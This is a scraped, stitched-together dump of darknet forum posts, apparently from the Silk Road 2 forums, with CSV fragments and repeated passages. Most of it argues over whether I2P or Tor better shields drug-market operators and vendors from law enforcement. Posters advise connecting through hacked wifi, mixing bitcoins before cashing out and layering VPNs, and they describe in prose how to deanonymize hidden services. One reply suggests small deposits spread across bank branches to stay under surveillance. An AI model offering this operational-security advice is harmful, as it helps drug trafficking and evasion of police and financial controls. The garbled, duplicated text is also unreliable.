for i2p to find peers and to become integrated with the network,so go take a dump, make a coffee or check how much much that stash of bitcoins is worth today. STEP 3 Now i2p has a default addressbook of sites that can be immediately accessed by opening a new tab and entering the address.TMP is currently being added to it so soon all you'll need to do is type themarketplace.i2p in the address bar and press enter.For now I've been using the following workaround:Type themarketplace.i2p in the address bar and press enter.At the moment this brings up a warning page telling you the Eepsite wasn't found in the addressbook.It also gives you the option of using a jump service (again this won't be necessary once TMP's in the default address book).Click the link to the stats.i2p jump service.** STEP 4b ** The jump service'll redirect you to an information page .Click 'Save themarketplace.i2p to private address book and continue to eepsite' and this'll take you to...THE LOGIN PAGESee, nuthin' to it.  It's a little extra effort for a lot more security.For more info on i2p I recommend this sub , on Bitcoin this sub,and for info on GPG (for everyone's safetyall messages must be encrypted) I recommend the main site .I'll do my best to answer any questions (that I know the answers to) as I'm sure will TMPSchultz.

And when it comes to correlation its more than just numbers, its when you log on, reply to messages, use the forum, they will correlate that with tor connections in your town. Even if you have a thousand tor users in your town the number that will be on at exactly the same time you are every single day is probably a very very small list. So your point is noted, but not founded. and dont use i2p because no one uses it? maybe we never had a good reason to, well nows the reason. As far as darkmarket sites go, i2p is way way safer for site operators than tor is, they can handle ANY load, whereas we've seen BMR go down (among other reasons) just because it would be relatively easy to geolocate a hidden server if it recieves too much traffic. with i2p everyone is a node (like a relay) therefore this never happens, everyone contributes just by being connected. have you actually taken the time to look at the site? its really well designed. for me im tired of seeing this operators abuse their power and steal from us, this site actually has taken the time and effort to give us their power so that situations like sheep never happen again. how many thousands of dollars must each vendor lose before they are willing to take that extra step?"

Silk Road will not be hosted on i2p for the foreseeable future for a number of reasons and we have already (in private) placed Silk Road on i2p for testing reasons before removing it. The issue with i2p right now is that it has no thorough research into it. Only two years ago Tor hidden services were believed to be very secure but once funding was thrown into proper research then a large number of attacks were uncovered - i2p has not had this attention and it is a poor step to assume because none have been publicly disclosed that none exist.  i2p is more ideal than Tor for peer to peer applications since that is the foundation of the network whereas Tor was designed to serve content to clients. Identification that you are a part of the i2p network is significantly easier than identifying users of the Tor network due to the peer to peer nature of it, all i2p users are in essence relays and so their IP is publicly available to connect to. However such a system makes traffic analysis against a server significantly easier.  i2p is designed to give users more protection than tor due to the relay to user ratio being significantly higher, but this comes at a cost of the traffic analysis risk. There is no chance any successful market such as Silk Road could run on i2p in it's current state and probably would be unable to do so without at least 40-50 other major services with an equal or larger sized userbase and in my view, at least x50-100 the current users. This is the primary reason behind our decision not to move onto i2p as it is far too small to host major services like ours.  We must remember, user security is imperative and right now Tor and i2p both provide similar levels of security to the end user, but the main target of any law enforcement attack will be the server of the service and the operator since it is more resource efficient to catch a central larger source of information than to chase individual users over theoretical network attacks. Let us not forget right now to our knowledge Tor is still safe and I personally believe with small improvements we can further protect the network, all attacks to date have hit the coding of the services targeted, the operators of the service or delivered an exploit through the user interface; none of which are network based flaws but human ones.  Silk Road is committed to protecting our network and we have actually already started to put relays online to help expand and improve Tor: https://atlas.torproject.org/#search/SilkRoad",""

Tor has bridges and obfsproxy to protect from the attack you mentioned. And there is a huge difference between needing to communicate with all ISP's in all areas of interest and being able to do it yourself without interaction with the ISP. With I2P they only need to ask who this IP address is assigned to when they have narrowed in on the vendor. Switching to I2P would be horrible for the users too, if we assume that there are 20k users of I2P right now and 100,000k users of SR, think of how easy it will be to get the IP addresses of all SR users once they join the I2P network. You could probably say with greater than 95% accuracy that any of the new IP addresses are involved with SR. It is just fucking retarded it would literally lead to massive enumeration of SR users and it would certainly lead to the deanonymization of several vendors, not to mention it isn't even giving any substantial benefit other than possibly plausible deniability from internal timing attacks if you are configured in such a way that you are certainly weak to the attack I mentioned against vendors.    So what is the point of switching to I2P then? You are not convincing me that we should switch to a new network that we need to use VPN's and Tor to access. Why not just stick with Tor? Tor is a fail safe for stupid vendors, only an idiot wouldn't realize that if we switched to I2P a lot of the vendors wouldn't know they need to do all of these things even if we told them so and they would end up getting busted. Switching to I2P is just a horrible idea it is totally not suited for what we are doing. If you want to switch to another network look at Freenet ages before you look at I2P, Freenet actually brings new things to the table and it doesn't have as many problems for us as I2P does. The only people who would pick a network like I2P to run a market on don't know what the hell they are doing, or they have malicious intentions.    Honestly it seems like you want to switch to I2P just for the sake of switching to I2P, while having only a superficial understanding of the properties of the different networks.

Thinking anything called an anonymity network has the same exact properties as all other things called anonymity networks is just retarded. I have been researching anonymity networks for a lot of years brah I actually know what I am talking about.    Wrong, Tor has entry guards and directory guards and bridges and obfsproxy all of which help protect from enumeration, freenet has darknet mode which helps protect from enumeration, the only network that by default makes enumeration trivial is I2P.    Sure using a VPN can help. Tor bridges are arguably better in that they attempt to conceal that you are using any anonymizer at all. Saying Tor bridges are like Tor VPN's is pretty fucking retarded, but if that is how you want to think of it go ahead. The only network that focuses on plausible deniability is Freenet, I2P might have it to an extent, Tor doesn't focus on it at all. If you don't know the difference between intelligence and evidence maybe you should learn about things before you spout off about shit you have no clue about.    Tor hidden services can scale well enough. You can't focus on potential plausible deniability from internal timing attacks while ignoring the increased risk to other more serious attacks that come with using I2P. From a global adversary perspective Tor and I2P are equally 100% fucked.    All of the academic researchers think that Tor is a better model. The leaked NSA slides show that the NSA thinks no other low latency anonymity network can come close to Tor. The only people who advocate strongly for I2P are people who I perceive to not have much of a clue what they are talking about. ","You've seem to missed the part where these are called ""anonymity networks"". ;No network conceals ones connection to it, freenet, tor, i2p, they can easily be gleaned by isps and law enforcement. ;VPN's help in all cases as it obscures your connection to the network, however Tor's bridges are not better than a VPN simply because they are like VPNs, but for Tor only. These networks provide plausable deniability, that is no one can prove what you are doing on it. If you are talking about guilt by association then you must be living in china or NK, better just not to connect to these networks in that case. ;I2P has potential for having not just a tiny darknet site with 10k users that must close down if it ever eclipses that, but a darknet site that can scale to any size. Because everyone runs as a relay its speed wont suffer either as we had seen when the botnet came online this summer, and plausible deniability (traffic modeling and timing correlation) is increased because like freenet or a Tor relay the source of traffic cannot be gleaned, the current client-relay model of general Tor usage is actually very easy to deanonymize from a global adversaries perspective. ;I2p is a better model all in all, though because its been neglected little research has been done into its design. For general net surfing and small hidden services Tor works fine, but for serious business structures i2p is the way to go. As far as i know freenet isnt capable of running an e-commerce site on it, freesites are static images that must be updated in whole using a new key, like changing a files contents and having to reupload it, it doesnt work interactive sites like SR."

Tor developers already have plans to prevent bridges from replying to arbitrary bridge requests, that attack is easy to defend from. I2P also doesn't protect from global adversaries anyone who says different is a fucking idiot.    NSA had internal documents leaked by Snowden that show that they consider Tor to be the best low latency anonymity network by a large margin. They didn't even bother mentioning I2P.    You have to trust your entry guards more than other nodes but freenet has plausible deniability, your entry guard can't tell if you requested a file or are merely routing it on for other nodes. Unless they do various attacks and wait for some period of time. Freenet isn't going to withstand a global external adversary that is also largely internal, but it still seems better than Tor and I2P, both of which are not going to resist a global external adversary even if the adversary isn't internal at all.    No you didn't really fix it for me at all. Bridges attempt to conceal that you are using any anonymizer at all. Of course this also entails concealing that you are trying to conceal that you are using any anonymizer at all. You could get infinitely recursive if you want, but you are just babbling at that point.   [/quote]  I2P hasn't even had hardly any research done on it at all. The academic world has turned mostly a blind eye toward it. Only recently has it had any papers at all released on it, and they were papers demonstrating various attacks. Why not listen to what Jacob Appelbaum has to say about I2P?    No it isn't a matter of site traffic vs network size. If Tor had 1,000,000,000 relays and the attacker just happened to own the entry guards of a hidden service they would still be able to deanonymize it. It is only probabilistically related to network size. Site traffic has even less of an effect in regards to many attacks, only a certain traffic volume intersection attack comes to mind. Also it is total bullshit that if the number of Tor relays dropped from 3k to 1k that DPR could be located tomorrow. First of all because Tor uses entry guards all of the traffic to hidden services is concentrated at the guard nodes regardless of how many other nodes are on the network, making it just as vulnerable to traffic volume intersection attacks with 3,000 nodes or 30,000 nodes. Second of all, you want to know the best way to deanonymize a new drug site on I2P? Have a few nodes to do total client enumeration. Keep track of the IP addresses of clients. Oh there is a new site? What are the chances that this new site is a new I2P nodes, no one that I enumerated two years ago? Ok, let's look at the most recent dozen I2P nodes since this site launched. Hm, I wonder if the site is one of these 12 new IP addresses! Let's send traffic to the hidden service and then DDoS each of these 12 nodes one at a time and look for correlations in how quickly the hidden site handles my traffic! Oh, there we go found the new hidden site. Seriously you are arguing that we compromise the security of not only the site operators and the vendors but also of everybody who uses the site. I2P is, for various reasons, not suited to running a drug market on!     No, it is a really bad idea.    Well, let's look at the difference between a drug user and a pedophile. Pedophiles look at CP on the internet. That is the extent of their threat model. If they are identified as likely pedophiles, but the police don't have enough evidence to get a search warrant, they are still good to go. Let's look at drug users. They use the internet only to order drugs in the mail. Drug vendors use the internet only to take orders from customers. If they are identified as likely drug users or vendors, the police can use this intelligence to target them in other ways that don't require warrants. They can have dogs sniff peoples mail. They can have the very very few people who use I2P in cities that vendors ship out of put under surveillance. They can randomly pull people over and say they were speeding. They still have a lot of options available to themselves. None of those options are effective against CP consumers. There is also the big difference that freenet users in darknet mode are not so easily enumerated as I2P users in the default mode. And once I2P users stop using the default mode, the few advantages I2P could have over Tor are thrown out the window. So stop conflating threat models and learn the difference between intelligence and evidence!      The first thing I would like to point out is that they don't even need to know who was connected at a certain time because I2P has so few users that any given city a vendor ships out of is not likely to have more than one or two I2P users, unless they are in a major city and still in these cases there will not be many users. Using a bridge is not at all similar to using a VPN. In your ISP's eyes if you traffic is obfuscated and going to a Tor bridge then they have no idea that you are using Tor unless they have enumerated all of the Tor bridges.    Just because we can use defense in depth doesn't mean we should use a less adequate network. Saying that it doesn't matter that I2P sucks because we can use random WiFi access points anyway pretty much sums up my thoughts on I2P for me.    And another compelling argument for I2P, mainly that we should use Tor to connect to it. Are we even running into serious scalability issues with Tor? Some rough spots on the old SR but it was up all the way to the very end when the feds seized it. You are trying to solve a problem that we haven't run into yet, and in doing so you are going to have us run into new problems that will be much more dangerous. ","Bridges are easily enumerated, perhaps moreso since they are mainly used by people who need to hide the fact they are using tor. China used a technique where they sent a special tor connection packet to every computer to see if they would respond as a bridge would, they instantly enumated the entire bridge network. Obfsproxy3 is reported to protect against this, but its an arm race, and of course governments have thousands of people to throw at what essentially comes down to going to a few sites and emailing tor devs to collect all this info. Also Tor doesnt protect against a global adversary, not only can they detect entire traffic flows, they can see the entire network, so anyone connecting to a public relay, or anyone connecting to a bridge connecting to a public relay can be enumerated. ;On that note, are we talking about NSA, NSA helping DEA, DEA on its own, or local law enforcement? These are entirely different threat models. NSA pwns tor, no hiding from them. NSA might offer help to dea, this is anyones guess. DEA/locals can query isp's in a given area, which i believe is the attack we were talking about, at least its the one i was. In this instance it doesnt matter how many hoops you give them to jump through or if you want to create a double back blindfolded super secret tunnel, it all leads back to an ip, and if you have any idea what you are doing it wont be yours. ;As for freenet, which is a moot point as i have already mentioned, its darknet mode is much like tor's entry guard, except instead of 3 layers of encryption there is only 1. You have to really really trust your entry guard. otherwise if you are just running as an open node (relay) then you at least have the plausible deniability that the traffic you are sending is just relayed from another node. This once again is not going to protect you from a global adversary who can from a birds eye view see that your node, relay or no, is the one generating the traffic.;QuoteSure using a VPN can help. Tor bridges are arguably better in that they attempt to conceal that you are trying to conceal that you are using any anonymizer at all. fixed that for you.;QuoteAll of the academic researchers think that Tor is a better model. The leaked NSA slides show that the NSA thinks no other low latency anonymity network can come close to Tor. The only people who advocate strongly for I2P are people who I perceive to not have much of a clue what they are talking about.The absence of evidence isnt evidence of absence, but since you speak on behalf of all academic researchers ill let you take the stand.;This is true, its very small compared to tor, however tor was small at one point too and quite insecure. The ""NSA can see the network and locate the servers"" issue is a matter of site traffic vs network size. If the number of relays suddenly dropped from 3k to 1k and SR's traffic remained the same DPR could be located tomorrow. This is because a large amount of traffic flowing to any particular node would reveal this (this is why BMR initially was set to shut down after sheep imploded), obviously in this case its better to have more nodes doing more things than just going to one site, which tor is good at as it interfaces with the clearnet so it carries much more utility for people. For a darknet drug site on i2p, its best design is to start small like SR did and grow over time with the network. As it grows more sites will appear to carry the burden and take the heat off.;So yes, SR on i2p, bad idea, a new marketplace on i2p, good idea. Which brings us to the next concern:;-if i2p got big because of one drug site then everyone on i2p would be considered a drug user-Well lets look at freenet, what is a distributed data storage anonymity network used for? CP of course. Is everyone connected to freenet a pedo? I suppose a better question would be, if guilt by association were a real thing then why do we have anonymous networks at all?;-i2p enumerates all connected nodes publicy and therefore vendors would be broadcasting their involvement-This attack involves cops buying from vendors to find out what city they're in. Once they do that they contact the ISP's in that city and figure out, based on forum posts and pm's to the vendor, who was connected to the anonymous network at that particular time, this gives a small list to investigate. Some preventative measures are to use bridges and attempt to conceal ones connection to tor, however this is equivalent to using a VPN that only routes tor traffic, doesnt do much if all you traffic is going to that, in their eyes its still part of the tor network. A better solution is to use a generic VPN (most of them are) and run tor and perhaps a bunch of junk traffic like bittorrent over it, this places the entry point into tor into the VPN's servers located in some other country.;The safest approach is to never connect from an ip connected to you, so public/hacked/unsecured wifi spots are key, this way even if they do get through all your defenses they are left at nothing.;-lets say i dont want my ip to be known connecting to i2p, then what-simple, run i2p in whonix or tails, it gets routed over tor so that your entry into the i2p network is your exit node. all the anonyimity of the tor network with all the access to a new anonymous network that can scale, unlike tor, to any size."

Participants can still release escrow even in the event of a LEO takeover or total shutdown. Approx $ police would net as a result of taking over themarketplace = 0.    The incentive to compromise the site is significantly reduced. However any network and server configuration will always have to face attacks.    This is a broad subject, buyer/vendor against localLE/NSA? Its hard to determine the threat model without knowing the specifics, however because you can access i2p through tor, you anonymity will remain roughly the same depending on your circumstance.    When you talk about network resilience you speak of its ability to withstand things like botnet/ddos attacks and such. Actually its much increased due to the fact the botnet zombies would most likely be running as nodes and therefore contribute to, instead of leech off of, the network. Though they could theoretically operate as clients instead of nodes, the Tor botnet's inability to upgrade to the latest version of Tor showed that botnet owners arent necessarily intent on taking down a network, and in the end it was the only thing that kept it from taking down the entire network. Tor is much more suspectible to being taken down by even a mid-sized botnet than is i2p. As for my experience so far, themarketplace has been quite fast only after a few minutes of being connected.   Wallet address can be generated by the thousands in batch, theres really no risk here, actually less since there is no site wallet to be connected to.   As long as vendors dont connect from home IP's and mix at least once before cashing out there is little risk of being identified this way. The biggest risk as we have seen so far is unsafe realworld practices, like vendors ordering drugs through the mail, lazy shipping techniques, or street dealing.    This im not entirely clear on, you'd have to ask shultz what exactly were his motivations for going to i2p, he posted a thread that mentioned vaguely his reasoning (from reddit):   [/quote]","Thank you. So we take from that the following points:1) The risk of loss of bitcoin through compromise of the market central site is significantly reduced. Primarily because the transaction is fundamentally a person to person transaction.;2) The risk of site compromise is probably the same as would be expected as a Tor hidden service;3) The risk of traffic profiling is probably the same as would be expected if the user were using Tor;4) The resilience of the network and thus access to the site is probably somewhat reduced compared with Tor;5) The risk of enumeration of vendor wallet addresses by malicious buyers is probably greater. (A standard LEO MO)6) The risk of enumeration of buyer wallets by malicious vendors is probably greater although in general this scenario seems less problematic.;To our mind the greatest threat to a vendor is identification and subsequent action by the LEO threat agent. this is probably followed by loss of revenue/earnings, the threat sources here are more diverse but include malicious market site operators and hackers. Remaining threats include loss of reputation etc which don't seem to be affected by market places. Buyers have different sources and agents of threat but LEO also feature up there as a high priority threat.;Perceptions of security aside though, the question we have to ask is why not host on Tor as well as I2P?

Vendors overwhelmingly don't even understand the technical details of the attacks they are exposing themselves to when they use I2P. Nobody knows how many Tor users are in their town because Tor uses entry guards and the overwhelming majority of clients don't route for other clients, and they have implemented directory guards even which greatly protects from enumeration as well.   I2P on the other hand consists of what 20,000 users and the default behavior is that all nodes route for all other nodes. You can gather the IP addresses of the majority of standard configured I2P clients without much trouble at all. Then all you need to do to find all vendors who have not protected themselves from this attack is to see where they ship from, then you compare the location of the IP addresses you enumerated to the shipping locations of vendors and perform an intersection attack. This is only one of the ways that I2P is worse than Tor for vendors and everybody else. Switching to I2P makes no fucking sense at all, it hasn't been as researched as Tor has and the research that has been done has exposed numerous flaws in it, the only significant advantage it could have over Tor is plausible deniability from internal correlation attacks but that will only work if you have it in a configuration that makes it vulnerable to the previously mentioned attack. There is really not an advantage to using I2P and it is pointless to put a market on I2P the people doing it are either doing it out of malicious intent or doing it because they are clueless.     Yeah everyone is a relay and the list of IP addresses of everyone is essentially public knowledge. That can be fine, up to the point you leak your geolocation when you ship a package. Once you leak your geolocation you go from being ""someone who uses I2P"" to being ""Someone who uses I2P in this geographic area"", and I2P has so few users and they are so widely dispersed that knowing someones rough geolocation and the fact that they use I2P is enough to deanonymize them or severely degrade the size of their anonymity set. It is absurd to say that I2P is safer than Tor is for markets, there are just as many known anonymity attacks against I2P hidden services as there are Tor hidden services, in particular I2P hidden services are much weaker to intersection attacks than Tor hidden services are. Neither Tor nor I2P provide very strong anonymity for hidden services, but I would have a much higher chance of being able to use traffic analysis to deanonymize an I2P site than a Tor site. Hell, just get a list of I2P routers and DDoS them one at a time while checking the status of the hidden service, you can't do that against Tor hidden services because they don't have their IP addresses listed as routing nodes unless you idiotically configure them as routing nodes. Also, the serve while you surf attack against Tor is very likely possible against I2P and all of the I2P nodes (mostly) route so they are all vulnerable to it. What stops me from sending data streams through all of the I2P nodes I am aware of simultaneously and then DDoSing the hidden service through I2P and watching for degraded performance in one of the streams I am sending through a routing node? Also, have you even read any of the recent research of I2P? They are still finding new attacks against it, whereas Tor has been much more thoroughly analyzed at this point. Also, Tor has a ton of people researching it and I2P is essentially just a footnote in some papers as far as the academic world is concerned.

No network conceals ones connection to it, freenet, tor, i2p, they can easily be gleaned by isps and law enforcement. VPN's help in all cases as it obscures your connection to the network, however Tor's bridges are not better than a VPN simply because they are like VPNs, but for Tor only. These networks provide plausable deniability, that is no one can prove what you are doing on it. If you are talking about guilt by association then you must be living in china or NK, better just not to connect to these networks in that case.    I2P has potential for having not just a tiny darknet site with 10k users that must close down if it ever eclipses that, but a darknet site that can scale to any size. Because everyone runs as a relay its speed wont suffer either as we had seen when the botnet came online this summer, and plausible deniability (traffic modeling and timing correlation) is increased because like freenet or a Tor relay the source of traffic cannot be gleaned, the current client-relay model of general Tor usage is actually very easy to deanonymize from a global adversaries perspective. I2p is a better model all in all, though because its been neglected little research has been done into its design. For general net surfing and small hidden services Tor works fine, but for serious business structures i2p is the way to go. As far as i know freenet isnt capable of running an e-commerce site on it, freesites are static images that must be updated in whole using a new key, like changing a files contents and having to reupload it, it doesnt work interactive sites like SR. ","From a users perspective I2P is not as safe as anything else, and the fact that you would use such a gross generalization to describe the anonymity networks is just proof of your lack of knowledge regarding these systems. Tor has bridges and obfsproxy to protect from the attack you mentioned. And there is a huge difference between needing to communicate with all ISP's in all areas of interest and being able to do it yourself without interaction with the ISP. With I2P they only need to ask who this IP address is assigned to when they have narrowed in on the vendor. Switching to I2P would be horrible for the users too, if we assume that there are 20k users of I2P right now and 100,000k users of SR, think of how easy it will be to get the IP addresses of all SR users once they join the I2P network. You could probably say with greater than 95% accuracy that any of the new IP addresses are involved with SR. It is just fucking retarded it would literally lead to massive enumeration of SR users and it would certainly lead to the deanonymization of several vendors, not to mention it isn't even giving any substantial benefit other than possibly plausible deniability from internal timing attacks if you are configured in such a way that you are certainly weak to the attack I mentioned against vendors. ;So what is the point of switching to I2P then? You are not convincing me that we should switch to a new network that we need to use VPN's and Tor to access. Why not just stick with Tor? Tor is a fail safe for stupid vendors, only an idiot wouldn't realize that if we switched to I2P a lot of the vendors wouldn't know they need to do all of these things even if we told them so and they would end up getting busted. Switching to I2P is just a horrible idea it is totally not suited for what we are doing. If you want to switch to another network look at Freenet ages before you look at I2P, Freenet actually brings new things to the table and it doesn't have as many problems for us as I2P does. The only people who would pick a network like I2P to run a market on don't know what the hell they are doing, or they have malicious intentions. "
"Silk Road 2 Forums","Loki","6485","2013-12-07T00:34:05","i2p's ""themarketplace"" is the most secure marketplace on the darknet","Discussion/Security"," Bridges are easily enumerated, perhaps moreso since they are mainly used by people who need to hide the fact they are using tor. China used a technique where they sent a special tor connection packet to every computer to see if they would respond as a bridge would, they instantly enumated the entire bridge network. Obfsproxy3 is reported to protect against this, but its an arm race, and of course governments have thousands of people to throw at what essentially comes down to going to a few sites and emailing tor devs to collect all this info. Also Tor doesnt protect against a global adversary, not only can they detect entire traffic flows, they can see the entire network, so anyone connecting to a public relay, or anyone connecting to a bridge connecting to a public relay can be enumerated.   On that note, are we talking about NSA, NSA helping DEA, DEA on its own, or local law enforcement? These are entirely different threat models. NSA pwns tor, no hiding from them. NSA might offer help to dea, this is anyones guess. DEA/locals can query isp's in a given area, which i believe is the attack we were talking about, at least its the one i was. In this instance it doesnt matter how many hoops you give them to jump through or if you want to create a double back blindfolded super secret tunnel, it all leads back to an ip, and if you have any idea what you are doing it wont be yours.   As for freenet, which is a moot point as i have already mentioned, its darknet mode is much like tor's entry guard, except instead of 3 layers of encryption there is only 1. You have to really really trust your entry guard. otherwise if you are just running as an open node (relay) then you at least have the plausible deniability that the traffic you are sending is just relayed from another node. This once again is not going to protect you from a global adversary who can from a birds eye view see that your node, relay or no, is the one generating the traffic.   fixed that for you.   The absence of evidence isnt evidence of absence, but since you speak on behalf of all academic researchers ill let you take the stand. ","You seem to have missed the part where Tor has bridges and obfsproxy and entry guards and freenet has darknet mode and I2P has by default all users route for other users making them super vulnerable to enumeration. Thinking anything called an anonymity network has the same exact properties as all other things called anonymity networks is just retarded. I have been researching anonymity networks for a lot of years brah I actually know what I am talking about. ;Sure using a VPN can help. Tor bridges are arguably better in that they attempt to conceal that you are trying to conceal that you are using any anonymizer at all. ;All of the academic researchers think that Tor is a better model. The leaked NSA slides show that the NSA thinks no other low latency anonymity network can come close to Tor. The only people who advocate strongly for I2P are people who I perceive to not have much of a clue what they are talking about."
"Silk Road 2 Forums","Loki","6485","2013-12-07T00:59:43","i2p's ""themarketplace"" is the most secure marketplace on the darknet","Discussion/Security","I should mention that the issues merge is trying to argue boil down to a subsection of attacks that exist for vendors and site operators. These go something like this:  -i2p is too small and therefore not safe to run a site on-  This is true, its very small compared to tor, however tor was small at one point too and quite insecure. The ""NSA can see the network and locate the servers"" issue is a matter of site traffic vs network size. If the number of relays suddenly dropped from 3k to 1k and SR's traffic remained the same DPR could be located tomorrow. This is because a large amount of traffic flowing to any particular node would reveal this (this is why BMR initially was set to shut down after sheep imploded), obviously in this case its better to have more nodes doing more things than just going to one site, which tor is good at as it interfaces with the clearnet so it carries much more utility for people. For a darknet drug site on i2p, its best design is to start small like SR did and grow over time with the network. As it grows more sites will appear to carry the burden and take the heat off.   So yes, SR on i2p, bad idea, a new marketplace on i2p, good idea. Which brings us to the next concern:  -if i2p got big because of one drug site then everyone on i2p would be considered a drug user-  Well lets look at freenet, what is a distributed data storage anonymity network used for? CP of course. Is everyone connected to freenet a pedo? I suppose a better question would be, if guilt by association were a real thing then why do we have anonymous networks at all?   -i2p enumerates all connected nodes publicy and therefore vendors would be broadcasting their involvement-  This attack involves cops buying from vendors to find out what city they're in. Once they do that they contact the ISP's in that city and figure out, based on forum posts and pm's to the vendor, who was connected to the anonymous network at that particular time, this gives a small list to investigate. Some preventative measures are to use bridges and attempt to conceal ones connection to tor, however this is equivalent to using a VPN that only routes tor traffic, doesnt do much if all you traffic is going to that, in their eyes its still part of the tor network. A better solution is to use a generic VPN (most of them are) and run tor and perhaps a bunch of junk traffic like bittorrent over it, this places the entry point into tor into the VPN's servers located in some other country.   The safest approach is to never connect from an ip connected to you, so public/hacked/unsecured wifi spots are key, this way even if they do get through all your defenses they are left at nothing.   -lets say i dont want my ip to be known connecting to i2p, then what-  simple, run i2p in whonix or tails, it gets routed over tor so that your entry into the i2p network is your exit node. all the anonyimity of the tor network with all the access to a new anonymous network that can scale, unlike tor, to any size.

So we take from that the following points:  1) The risk of loss of bitcoin through compromise of the market central site is significantly reduced. Primarily because the transaction is fundamentally a person to person transaction. 2) The risk of site compromise is probably the same as would be expected as a Tor hidden service 3) The risk of traffic profiling is probably the same as would be expected if the user were using Tor 4) The resilience of the network and thus access to the site is probably somewhat reduced compared with Tor 5) The risk of enumeration of vendor wallet addresses by malicious buyers is probably greater. (A standard LEO MO) 6) The risk of enumeration of buyer wallets by malicious vendors is probably greater although in general this scenario seems less problematic.  So on balance the risks are somewhat different which may suit some well but it is important to understand that it is not necessarily more or less secure. That is a matter of perspective and depends on the threats you face.  To our mind the greatest threat to a vendor is identification and subsequent action by the LEO threat agent. this is probably followed by loss of revenue/earnings, the threat sources here are more diverse but include malicious market site operators and hackers. Remaining threats include loss of reputation etc which don't seem to be affected by market places. Buyers have different sources and agents of threat but LEO also feature up there as a high priority threat.  Perceptions of security aside though, the question we have to ask is why not host on Tor as well as I2P? We cannot think of many good reasons why a site could not be available to both networks simultaneously other than technical complexity and integration.

It is like someone seeing that a cloth shirt can be shot through with a gun so he concludes that wearing nothing must protect him.    Recent events show that if a server is hacked it can be deanonymized if the admin didn't take any measures against application layer deanonymization attacks. I2P is identical to Tor in this way, I2P will not magically protect a server that has been remotely rooted, if you want to do that you need to use various isolation techniques. The recent events also show that if you misconfigure your server and it leaks its own IP address that anonymizers wont keep you safe. I2P and Tor are both equally weak to this sort of problem, you need to use various isolation techniques to ensure that an IP address leak is not possible. The only thing recent events show us is that people who don't know what they are doing can't magically run an anonymizer and expect to be able to keep a hidden service hidden. We have no proof of any direct attacks on Tor leading to deanonymization of a hidden service, the last time that happened was in an academic context in 2006 prior to entry guards being added. Furthermore, recent research on I2P has exposed significant weaknesses:    wwwcip.informatik.uni-erlangen.de/~spjsschl/i2p.pdf   grothoff.org/christian/teaching/2011/2194/i2p.odp    These are just some of the published papers. Outside of published literature, anonymity experts are aware of various other attacks against I2P, some of which I have already mentioned.    I2P is hardly a distributed platform with the simple rule of ""don't trust anyone"", it still gives a single server administrator complete control of the server. Freenet is closer to doing what he claims he wants to do.    Tor has end to end encryption for its hidden services.    I2P hidden services can still be DDOSed, and if they are DDOSed it can quickly lead to deanonymization in the standard mode of configuration.    I2P is the worst choice of all the darknets to put a market hidden service on. Their large amount of research is probably measured in hours or days, maybe instead you should listen to people who have done research for years, especially people who have done research in academic settings. ","We would like to explain our decison to use i2p rather than Tor. We feel that the recent events haveshown that given enough resources, Tor hidden services can be identified.;tables (DHTs) in this environment.I2P was built with these security problems in mind, and the networkis considered to provide anonymity for all practical purposes. Unfortu-nately, this is not entirely justified. In this paper, we present a group ofattacks that can be used to deanonymize I2P users. Specifically, we showthat an attacker, with relatively limited resources, is able to deanonymizea I2P user that accesses a resource of interest with high probability.;We developed an attack on I2P version 0.83Use a Denial-of-Service attack to facilitate traffic analysisDeanonymization targets are I2P Eepsites;We feel that moving to acompletly distributed platform built on the simple rule of ""Don't trust anyone"" is the best choicefor continued survival.;i2p is not a tool for accessing the internet annonymously, rather a complete darknet which is purposebuilt with end to end encryption. ;Each end point is only known by a public key and being distributed,it also helps prevent a DDOS attack from providing a location as there is no main nodes. Every personconnected to i2p is a relay for cryptographic information that is encrypted multiple times and passedalong the chain to be decrypted once at each hop.;We have done large amounts of research into all available hidden networks and we feel that i2p is thebest choice right now.

There are a lot of factors that determine hard drive storage: image qaulity, image size, frames per second, activity.     A lot of normal businesses like to have 30 days.  A bank would probably want more.  Maybe 90 or more but their is always a price.    My advice, less is more.  Make your deposit amounts less. Go to different branches if possible.  ","Second how long does a bank usually keep video surveillance? "

""GnuPGP"" sounds like Kleopatra. Am I correct?   I KNOW for a fact that you can import your private key into PGP4USB, but if you have Kleopatra keys that you want to import, it won't be compatible. It'll work fine, but then when someone goes to decrypt your message they won't be able to because, for some reason, there's space between every line in the encrypted message. (Found that one out the hard way.)   If you're using Kleoptra (PGP4Win), my suggestion is to bag it and start fresh with PGP4USB. The keys are stronger, so the encryption is better. Besides, you take it with you on the go!  Let me know if you have Kleopatra; I have both, so I can play around with my Kleopatra and see if importing a private key rather than generating a new one is possible...  ~Hippiechick","i am going to be formatting and reinstalling windows in a few days as i have some fucked up ad/malware which just won't shift no matter what. so i need to keep my pgp keys for when i have the new os. what do i do, can i just import my own public/private keys into the new pgp software or what do i need to do?"

If it is a BTC exchange, which in itself is a legal business, the very fact he asked for such advise hear wouldn't go down well with LE should they ever knock on his door.  Running a Hidden Service successfully is not something Joe Blow can just decide to do on a whim, create a website and host it. There is much more one needs than coding skills to set-up a Hidden Service and operate it anonymously, especially for an extended period of time. The guides on the Tor website are basic at best and don't cover the intricate details an Administrator would need to know to keep a step or two ahead of anyone looking to unmask the location of their server/s.  All fallingsnow has done is made this person think twice about what they are thinking of doing and potentially prevent them from making a mistake they can't correct. It's by no means a simple task and for someone with little to no prior experience in setting up and creating a new onion site and hosting it on the Tor network, it would be a minefield at best.

Macs can have trouble when it comes to booting another operating system from something like a usb. Another option would be to run another OS, like linux or something, through a virtual machine (you can store the data of the other OS on a usb or something to keep it off the computer). On the pgp for usb thing, there isn't much you can do while using mac's osx. GPGtools is an alright client for mac. A simple approach that will provide a little more security would be to just keep things like torbrowser and your gpg keychain access on an encrypted USB. Then you can just plug the USB in and decrypt it to acess its files. Then when you are done you can re-encrypt it and remove it from your mac. For the recreational user, mac's osx is alright, but if you really want to take your security seriously, using a virtual machine or bootable drive is the way to go.","Quote from: josefiend on September 23, 2014, 02:16:43 pmI function on PC/Linux but I have introduced my friend to the dark web, the only problem is he is a mac user.

